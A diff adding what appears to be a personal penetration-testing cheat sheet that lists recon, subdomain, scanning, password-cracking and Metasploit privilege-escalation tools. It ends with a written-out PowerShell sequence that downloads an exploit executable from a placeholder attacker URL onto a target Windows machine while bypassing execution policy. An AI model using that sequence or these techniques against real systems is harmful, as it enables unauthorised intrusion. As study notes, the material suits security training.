@@ -1,0 +1,165 @@
+ip info --> https://ipinfo.io
+whois lookup --> https://whois.domaintools.com/  ,  https://www.whois.net/  ,  https://lookup.icann.org/
+
+
+hunter.io  - Email Hunting
+snov.io  -  Email Hunting
+phonebook.cz   - Email Hunting
+
+hashes.org/leak.php  -  Leaked credentials
+havibeenpawned    - Leaked Credentials
+
+https://www.speedguide.net  -->  Ports | Protocols | Services
+
+/usr/share/wordlists  --> Kali inbuilt wordlist
+
+
+The Harvester  -  to id Usernames , email and subdomains
+
+
+- Tools to Hunt SUB-DOMAINS
+
+•   Sublist3r
+•   crt.sh
+•   Subfinder
+•   Owasp Amass
+•   Sub-Domain Finder  -  https://chaos.projectdiscovery.io/#/
+•   Sub-Domain Finder / Reverse Ip Look-up  - https://rapiddns.io/
+•   Subdomanizer
+
+
+- Tool to Check a live SUB-DOMAIN
+
+• httprobe
+• httpx
+
+
+- Tools Used to ID Website Technologies
+
+• https://builtwith.com/  **
+• https://www.netcraft.com/  **  
+• Wappalyzer - Extension For Firefox
+• whatweb - buit-in kali
+• https://spyse.com/
+
+
+
+- Tools for Scanning
+• arp-scan  (discovering internal ip)
+• netdiscover  (discovering internal ip)
+• nmap
+• masscan
+• metasploit auxillary framework
+• naabu
+
+
+- Tools For Vul Scanning and 
+• Nikto - vulnerability Scanner
+• Nessus    (Vulnerability Scanner) 
+• Acunetix  (Vulnerability Scanner)
+• Qualys    (Vulnerability Scanner)
+• Netspark  (Vulnerability Scanner)
+
+- Directory Busting
+• DirBuster
+• Dirb  *
+• Gobuster
+• dirstalk
+• dirsearch  ** 
+
+
+- TOOLS USED
+• Metasploit    (for exploitation)
+• Searchsploit   (for searching exploits)
+• smbclient   (to connect to SMB)
+• smbmap  (to connect and enumerate smb)
+• msfvenom  (to create payloads) 
+
+
+- For researching vulnerability
+• exploit-db
+• github
+• rapid7
+• searchsploit
+• cvedetails
+• www.speedguide.net
+
+
+- Password Attack
+• Unshadown   { to combine /etc/shadow and /etc/passwd together }
+• Hashcat   { to break password hashes }
+• Hydra
+• Metasploit Auxillary Framework
+• John The ripper (crack password hashes)
+• Burp Suite { Intruder Option --> “Brute Force” “Cred Stuffing” “Password Spraying” }
+• https://crackstation.net/   {Online Password hash cracker}
+
+
+- HTTP Methods
+• curl   {to send crafted packets to a server}
+• davtest   {to check which HTTP Methods are allowed with which file extension on the target}
+
+
+- CMD file download
+• wget  (linux)
+• curl (linux)
+• certutil -urlcache   (windows)
+
+
+- Privilege Escalation
+• Metasploit post module  "local_exploit_suggester"    { Shell needed for Windows --> Meterpreter  ,  Other OS -->  SHELL / Generic SHELL }
+• Metasploit post module  "shell_to_meterpreter"   ( To convert a Shell session to a Meterpreter session )
+
+• LinEnum.sh    {github}
+• linuxprivchecker.py   {github}
+• #sudo -l       ( to see the path from where a user can run as root)
+
+• Sherlock / Watson {github}  Windows Priv Esc     
+• Windows Exploit Suggester   {github}  Windows Priv Esc     (needs complete systeminfo)
+• post/windows/manage/migrate   {msfconsole}   Windows Process Migration
+
+
+- Msfconsole Tools
+• load -l            {meterpreter tools}
+• shell_to_meterpreter       {module}
+• post/windows/manage/migrate
+• Metasploit post module  "local_exploit_suggester"  { Shell needed for Windows --> Meterpreter  ,  Other OS -->  SHELL / Generic SHELL }
+
+
+- Other Shells
+• #psexec.py
+• #smbexec.py
+• #wmiexec.py
+• netcat
+
+
+- Wordlists
+• dirb
+• dirbuster
+• nmap scripts (not wordlists)
+
+
+- Dumping
+• hashdump  (meterpreter)
+• cewl  ( pulls down words from a blog)
+• DNSCewl
+
+- BufferOverflow
+• generic_send_tcp   (spiking)
+• 
+• 
+• 
+• 
+• 
+• 
+
+
+- Transferring an Exploit from Attacker Server to Target Windows Machine as an ".exe" Script
+
+• echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+  echo $url = "http://URL_of_Exploit" >>wget.ps1
+  echo $file = "exploit.exe" >>wget.ps1
+  echo $webclient.DownloadFile($url,$file) >>wget.ps1
+  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+ 
+ 
